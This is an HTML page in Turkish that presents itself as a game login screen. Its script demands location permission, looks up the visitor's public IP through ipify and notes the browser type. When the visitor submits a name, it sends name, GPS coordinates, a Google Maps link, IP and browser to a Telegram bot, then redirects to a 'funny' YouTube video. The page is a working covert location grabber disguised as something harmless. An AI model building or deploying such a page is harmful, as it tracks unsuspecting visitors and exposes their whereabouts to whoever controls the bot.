<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Giriş Sayfası</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #f0f0f0, #d0eaff);
      text-align: center;
      padding-top: 100px;
    }
    input, button {
      padding: 10px;
      font-size: 16px;
      margin: 10px;
    }
    #uyari {
      color: red;
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h2>🎮 Giriş Yap</h2>
  <input type="text" id="username" placeholder="Adınızı girin">
  <br>
  <button onclick="girisYap()">🚀 Giriş Yap</button>
  <div id="uyari"></div>

  <script>
    let konum = null;
    let ipAdres = "Bilinmiyor";
    let tarayici = "Bilinmiyor";

    // Sayfa açılır açılmaz konum ve IP alınır
    window.onload = async function() {
      // Konum
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          konum = {
            lat: position.coords.latitude,
            lon: position.coords.longitude
          };
        }, function(error) {
          document.getElementById("uyari").textContent = "📍 Bu site için konum izni gerekiyor!";
        });
      }

      // IP adresi
      try {
        const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
        ipAdres = ipData.ip;
      } catch (e) {
        ipAdres = "Alınamadı";
      }

      // Tarayıcı bilgisi
      const ua = navigator.userAgent;
      if (ua.includes("Chrome")) tarayici = "site:Chrome";
      else if (ua.includes("Firefox")) tarayici = "site:Firefox";
      else if (ua.includes("Safari") && !ua.includes("Chrome")) tarayici = "site:Safari";
      else if (ua.includes("Edg")) tarayici = "site:Edge";
      else tarayici = "site:Bilinmiyor";
    };

    async function girisYap() {
      const name = document.getElementById("username").value.trim();
      const uyari = document.getElementById("uyari");
      uyari.textContent = "";

      if (!konum) {
        uyari.textContent = "📍 Bu site için konum izni gerekiyor!";
        return;
      }

      if (!name) {
        uyari.textContent = "🧠 İsim yaz adamım, bir isime ihtiyacın var!";
        return;
      }

      // bilgiler.txt dosyasını oku
      const response = await fetch("bilgiler.txt");
      const text = await response.text();
      const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
      const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();

      const mapsLink = `https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
      const message = `🎮 Yeni Giriş!\n\n👤 İsim: *${name}*\n📍 Konum: *${konum.lat}, ${konum.lon}*\n🌐 Harita: [Google Maps](${mapsLink})\n🖥️ IP: *${ipAdres}*\n🧭 Tarayıcı: *${tarayici}*`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      };

      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      // Komik video açılır
      window.location.href = "https://www.youtube.com/watch?v=gdCZMdkdlBg";
    }
  </script>
</body>
</html>
